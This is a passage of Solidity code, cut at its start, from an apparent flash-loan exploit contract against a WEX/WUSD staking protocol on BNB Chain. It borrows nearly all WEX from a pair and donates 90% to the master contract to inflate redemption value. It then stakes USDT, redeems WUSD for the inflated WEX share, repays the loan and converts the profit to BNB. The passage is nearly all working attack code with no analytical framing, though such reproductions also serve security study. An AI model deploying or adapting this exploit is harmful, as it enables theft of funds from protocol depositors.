        (uint112 reserve0, uint112 reserve1,) = usdtWexPair.getReserves();

        // Flash loan WEX (token1)
        flashLoanAmount = uint256(reserve1) * 99 / 100;

        // Execute flash loan - borrow WEX (amount1Out)
        usdtWexPair.swap(0, flashLoanAmount, address(this), abi.encode(flashLoanAmount));

        // Convert remaining tokens to WBNB
        uint256 wexBalance = wex.balanceOf(address(this));
        if (wexBalance > 0) {
            wex.approve(address(router), wexBalance);
            address[] memory path = new address[](2);
            path[0] = address(wex);
            path[1] = address(wbnb);
            router.swapExactTokensForTokens(wexBalance, 0, path, address(this), block.timestamp);
        }

        // Convert WBNB to native BNB
        uint256 wbnbBalance = wbnb.balanceOf(address(this));
        if (wbnbBalance > 0) {
            IWBNB(address(wbnb)).withdraw(wbnbBalance);
        }
    }

    function waultSwapCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(usdtWexPair), "not pair");

        // Step 1: Donate most of the borrowed WEX to the master contract
        uint256 wexBalance = wex.balanceOf(address(this));
        uint256 donateAmount = wexBalance * 90 / 100; // Donate 90%
        wex.transfer(address(master), donateAmount);

        // Step 2: Swap remaining WEX to WBNB using WBNB-WEX pair (different pair, not locked!)
        uint256 remainingWex = wex.balanceOf(address(this));
        wex.approve(address(router), remainingWex);
        address[] memory path1 = new address[](2);
        path1[0] = address(wex);
        path1[1] = address(wbnb);
        router.swapExactTokensForTokens(remainingWex, 0, path1, address(this), block.timestamp);

        // Step 3: Swap WBNB to USDT using WBNB-USDT pair
        uint256 wbnbBalance = wbnb.balanceOf(address(this));
        wbnb.approve(address(router), wbnbBalance);
        address[] memory path2 = new address[](2);
        path2[0] = address(wbnb);
        path2[1] = address(usdt);
        router.swapExactTokensForTokens(wbnbBalance, 0, path2, address(this), block.timestamp);

        // Step 4: Stake USDT to get WUSD
        uint256 usdtBalance = usdt.balanceOf(address(this));
        uint256 maxStake = master.maxStakeAmount();
        if (usdtBalance > maxStake) {
            usdtBalance = maxStake;
        }
        usdt.approve(address(master), usdtBalance);
        master.stake(usdtBalance);

        // Step 5: Redeem all WUSD - we get back USDT + inflated WEX share
        uint256 wusdBalance = wusd.balanceOf(address(this));
        master.redeem(wusdBalance);

        // Step 6: Repay flash loan with WEX (we borrowed WEX, need to repay WEX)
        // Flash loan fee is 0.3% for Uniswap V2
        uint256 repayAmount = flashLoanAmount * 1003 / 1000;

        // We need to get WEX to repay - swap USDT to WEX using WBNB as intermediary
        uint256 usdtForRepay = usdt.balanceOf(address(this));
        usdt.approve(address(router), usdtForRepay);
        address[] memory path3 = new address[](3);
        path3[0] = address(usdt);
        path3[1] = address(wbnb);
        path3[2] = address(wex);
        router.swapExactTokensForTokens(usdtForRepay, repayAmount, path3, address(this), block.timestamp);

        // Repay the flash loan
        wex.transfer(address(usdtWexPair), repayAmount);
    }

    receive() external payable {}
}
